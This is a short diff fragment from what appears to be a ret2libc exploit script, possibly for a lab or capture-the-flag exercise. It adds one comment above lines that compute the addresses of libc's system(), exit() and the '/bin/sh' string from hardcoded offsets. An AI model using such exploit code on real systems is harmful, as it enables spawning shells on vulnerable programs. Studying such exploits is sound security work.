@@ -117,6 +117,7 @@ system_offset = 0x49860
 exit_offset = 0x3F100
 #######
 
+# calculate addresses as ints:
 bin_sh_string = bin_sh_offset + libc_start
 system_call = system_offset + libc_start
 exit_call = exit_offset + libc_start
